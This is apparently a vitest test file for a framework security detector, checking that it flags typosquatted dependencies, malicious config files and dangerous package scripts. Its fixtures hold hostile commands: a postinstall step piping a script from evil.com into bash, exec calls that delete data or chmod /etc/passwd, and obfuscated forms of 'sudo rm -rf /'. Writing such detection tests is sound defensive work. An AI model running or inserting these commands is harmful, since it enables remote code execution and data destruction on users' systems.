/**
 * Task 1.1.3 Framework Security - Comprehensive Vulnerability Resolution Tests
 *
 * These tests validate the fixes for critical security vulnerabilities identified
 * during comprehensive edge case analysis of the framework security system.
 */

import { mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  detectFrameworkSecurely,
  TRUSTED_FRAMEWORK_DEPENDENCIES,
} from '../../../core/foundation/security/framework.js';

describe('Task 1.1.3 Critical Security Vulnerability Resolution', () => {
  let testDir: string;

  beforeEach(async () => {
    testDir = join(tmpdir(), `vuln-fix-test-${Date.now()}`);
    await mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    try {
      await rm(testDir, { recursive: true });
    } catch {}
  });

  describe('Critical Vulnerability #1: Framework Detection Bypass via Malicious-Only Dependencies', () => {
    it('should detect and validate frameworks with only suspicious dependencies', async () => {
      // Create package.json with ONLY suspicious dependencies (no trusted ones)
      const maliciousDepsOnly = {
        name: 'malicious-only-project',
        dependencies: {
          'evil-react': '^1.0.0', // Malicious prefix
          reactt: '^18.0.0', // Typosquatting
          'backdoor-utils': '^1.0.0', // Malware indicator
          a: '^1.0.0', // Very short name (suspicious)
          '123abc456': '^1.0.0', // Number-letter-number pattern
        },
        scripts: {
          postinstall: 'curl https://evil.com/malware.sh | bash',
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(maliciousDepsOnly));

      // BEFORE FIX: This would return null (no framework detected)
      // AFTER FIX: Should detect a generic framework and validate security
      const result = await detectFrameworkSecurely(testDir);

      expect(result).not.toBeNull(); // Framework should be detected
      expect(result?.dependencies.security.hasSuspiciousDeps).toBe(true);
      expect(result?.dependencies.suspicious.length).toBeGreaterThan(0);
      expect(result?.security.isSecure).toBe(false); // Should fail security validation
      expect(result?.isValid).toBe(false); // Should be marked as invalid
    });

    it('should handle mixed trusted and suspicious dependencies correctly', async () => {
      const mixedDeps = {
        name: 'mixed-deps-project',
        dependencies: {
          react: '^18.0.0', // Trusted
          'evil-react': '^1.0.0', // Suspicious
          next: '^14.0.0', // Trusted
          backdoor: '^1.0.0', // Suspicious
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(mixedDeps));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).not.toBeNull();
      expect(result?.dependencies.trusted).toContain('react');
      expect(result?.dependencies.trusted).toContain('next');
      expect(result?.dependencies.suspicious).toContain('evil-react');
      expect(result?.dependencies.suspicious).toContain('backdoor');
      expect(result?.dependencies.security.hasSuspiciousDeps).toBe(true);

      // Should still pass basic validation due to trusted dependencies
      // but have security warnings
      expect(result?.security.warnings.length).toBeGreaterThan(0);
    });
  });

  describe('Critical Vulnerability #2: Configuration File Security Bypass', () => {
    it('should detect malicious require() statements despite whitelist', async () => {
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'require-bypass-test',
          dependencies: { next: '^14.0.0' },
        })
      );

      // Malicious config with dangerous require() that looks legitimate
      const maliciousConfig = `
        /** @type {import('next').NextConfig} */
        const nextConfig = {
          webpack: (config) => {
            // This should be detected as dangerous despite require() whitelist
            const { exec } = require('child_process');
            exec('rm -rf /important/data');
            return config;
          }
        };
        module.exports = nextConfig;
      `;

      await writeFile(join(testDir, 'next.config.js'), maliciousConfig);

      const result = await detectFrameworkSecurely(testDir);

      // Should detect the dangerous pattern despite require() being whitelisted
      expect(result?.security.isSecure).toBe(false);
      expect(result?.security.violations.some((v) => v.type === 'script-injection')).toBe(true);
    });

    it('should detect malicious import() statements', async () => {
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'import-bypass-test',
          dependencies: { next: '^14.0.0' },
        })
      );

      const maliciousImport = `
        const nextConfig = {
          webpack: async (config) => {
            const { exec } = await import('child_process');
            exec('sudo chmod 777 /etc/passwd');
            return config;
          }
        };
        module.exports = nextConfig;
      `;

      await writeFile(join(testDir, 'next.config.js'), maliciousImport);

      const result = await detectFrameworkSecurely(testDir);

      expect(result?.security.isSecure).toBe(false);
      expect(
        result?.security.violations.some(
          (v) => v.type === 'script-injection' && v.severity === 'high'
        )
      ).toBe(true);
    });

    it('should handle complex bypass attempts mixing legitimate and malicious patterns', async () => {
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'complex-bypass-test',
          dependencies: { next: '^14.0.0' },
        })
      );

      const complexBypass = `
        // Legitimate TypeScript patterns to confuse whitelist
        /** @type {import('next').NextConfig} */
        
        // Hidden malicious code between legitimate patterns
        const config = {
          webpack: (config) => {
            // Legitimate require() followed by malicious usage
            const fs = require('fs'); /* This require looks legitimate */
            const cp = require('child_process'); 
            
            // Hidden dangerous execution
            cp.exec(\`eval('process.exit(1)')\`);
            
            return config;
          }
        };
        
        module.exports = config; // Whitelisted pattern
      `;

      await writeFile(join(testDir, 'next.config.js'), complexBypass);

      const result = await detectFrameworkSecurely(testDir);

      expect(result?.security.isSecure).toBe(false);
      expect(result?.security.violations.length).toBeGreaterThan(0);
      expect(result?.security.violations.some((v) => v.severity === 'critical')).toBe(true);
    });
  });

  describe('Critical Vulnerability #3: Trusted Dependencies Set Mutation', () => {
    it('should prevent runtime modification of trusted dependencies', () => {
      const originalSize = TRUSTED_FRAMEWORK_DEPENDENCIES.size;

      // Attempt to add malicious dependencies should throw errors
      expect(() => {
        (TRUSTED_FRAMEWORK_DEPENDENCIES as unknown as Set<string>).add('evil-malware');
      }).toThrow(/Cannot add dependency.*immutable for security/);

      expect(() => {
        (TRUSTED_FRAMEWORK_DEPENDENCIES as unknown as Set<string>).add('../../../etc/passwd');
      }).toThrow(/Cannot add dependency.*immutable for security/);

      // Size should remain unchanged
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.size).toBe(originalSize);

      // Malicious deps should not be trusted
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('evil-malware')).toBe(false);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('../../../etc/passwd')).toBe(false);
    });

    it('should prevent deletion of trusted dependencies', () => {
      const originalSize = TRUSTED_FRAMEWORK_DEPENDENCIES.size;

      // Attempt to remove legitimate dependencies should throw errors
      expect(() => {
        (TRUSTED_FRAMEWORK_DEPENDENCIES as unknown as Set<string>).delete('react');
      }).toThrow(/Cannot delete dependency.*immutable for security/);

      expect(() => {
        (TRUSTED_FRAMEWORK_DEPENDENCIES as unknown as Set<string>).delete('next');
      }).toThrow(/Cannot delete dependency.*immutable for security/);

      // Dependencies should still be trusted
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('react')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('next')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.size).toBe(originalSize);
    });

    it('should prevent clearing of trusted dependencies', () => {
      const originalSize = TRUSTED_FRAMEWORK_DEPENDENCIES.size;

      // Attempt to clear all trusted dependencies should throw error
      expect(() => {
        (TRUSTED_FRAMEWORK_DEPENDENCIES as unknown as Set<string>).clear();
      }).toThrow(/Cannot clear trusted dependencies.*immutable for security/);

      // Set should remain intact
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.size).toBe(originalSize);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('react')).toBe(true);
    });
  });

  describe('Critical Vulnerability #4: Script Validation Inconsistencies', () => {
    it('should consistently validate chmod commands across all validators', async () => {
      const chmodPackage = {
        name: 'chmod-test',
        dependencies: { next: '^14.0.0' },
        scripts: {
          dangerous1: 'chmod 777 /etc/passwd',
          dangerous2: 'chmod +x /tmp/malicious.sh',
          dangerous3: 'chmod 777 .',
          safe1: 'chmod 644 src/config.js',
          safe2: 'chmod +r README.md',
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(chmodPackage));

      const result = await detectFrameworkSecurely(testDir);

      // All dangerous chmod patterns should be detected consistently
      expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result?.buildConfig.security.suspiciousScripts).toContain('dangerous1');
      expect(result?.buildConfig.security.suspiciousScripts).toContain('dangerous2');
      expect(result?.buildConfig.security.suspiciousScripts).toContain('dangerous3');

      // Safe chmod patterns should pass
      expect(result?.buildConfig.security.suspiciousScripts).not.toContain('safe1');
      expect(result?.buildConfig.security.suspiciousScripts).not.toContain('safe2');
    });

    it('should detect PowerShell and other platform-specific dangerous commands', async () => {
      const platformPackage = {
        name: 'platform-test',
        dependencies: { next: '^14.0.0' },
        scripts: {
          powershell1: 'powershell -c "Remove-Item -Recurse C:\\\\"',
          powershell2: 'pwsh -Command "Get-Process | Stop-Process"',
          cmd1: 'cmd /c "del /f /s /q C:\\\\*"',
          'unsafe-npm': 'npm install --unsafe-perm',
          'script-exec': './malicious.sh && rm -rf /',
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(platformPackage));

      const result = await detectFrameworkSecurely(testDir);

      // All platform-specific dangerous commands should be detected
      expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result?.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(2);

      // Specific dangerous patterns should be caught
      const suspiciousScripts = result?.buildConfig.security.suspiciousScripts || [];
      expect(suspiciousScripts).toContain('script-exec'); // Contains rm -rf
    });

    it('should handle obfuscated malicious commands', async () => {
      const obfuscatedPackage = {
        name: 'obfuscated-test',
        dependencies: { next: '^14.0.0' },
        scripts: {
          // These will be evaluated at package.json parsing time
          base64: Buffer.from('c3VkbyBybSAtcmYgLw==', 'base64').toString(),
          charcode: String.fromCharCode(115, 117, 100, 111, 32, 114, 109, 32, 45, 114, 102, 32, 47),
          joined: ['s', 'u', 'd', 'o', ' ', 'r', 'm', ' ', '-', 'r', 'f', ' ', '/'].join(''),
          template: `${'sudo'} rm -rf /`,
        },
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(obfuscatedPackage));

      const result = await detectFrameworkSecurely(testDir);

      // All obfuscated dangerous commands should be detected after evaluation
      expect(result?.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result?.buildConfig.security.privilegeEscalation.length).toBeGreaterThan(0);

      // All obfuscated scripts should be flagged
      const suspiciousScripts = result?.buildConfig.security.suspiciousScripts || [];
      expect(suspiciousScripts).toContain('base64');
      expect(suspiciousScripts).toContain('charcode');
      expect(suspiciousScripts).toContain('joined');
      expect(suspiciousScripts).toContain('template');
    });
  });

  describe('Additional Edge Cases and Security Validations', () => {
    it('should handle extremely large dependency lists without performance issues', async () => {
      const largeDeps: Record<string, string> = { next: '^14.0.0' };

      // Add 1000 suspicious dependencies
      for (let i = 0; i < 1000; i++) {
        largeDeps[`evil-package-${i}`] = '^1.0.0';
      }

      const largePackage = {
        name: 'large-deps-test',
        dependencies: largeDeps,
      };

      await writeFile(join(testDir, 'package.json'), JSON.stringify(largePackage));

      const start = Date.now();
      const result = await detectFrameworkSecurely(testDir);
      const duration = Date.now() - start;

      // Should complete within reasonable time
      expect(duration).toBeLessThan(5000); // 5 seconds max

      // Should still detect the framework and suspicious dependencies
      expect(result).not.toBeNull();
      expect(result?.dependencies.security.hasSuspiciousDeps).toBe(true);
    });

    it('should handle concurrent detection calls safely', async () => {
      await writeFile(
        join(testDir, 'package.json'),
        JSON.stringify({
          name: 'concurrent-test',
          dependencies: { react: '^18.0.0' },
          scripts: { build: 'echo "safe build"' },
        })
      );

      // Run multiple concurrent detections
      const promises = Array(10)
        .fill(0)
        .map(() => detectFrameworkSecurely(testDir));

      const results = await Promise.all(promises);

      // All results should be consistent
      results.forEach((result) => {
        expect(result?.name).toBeDefined();
        expect(result?.dependencies.trusted).toContain('react');
        expect(result?.security.isSecure).toBe(true);
      });
    });
  });
});
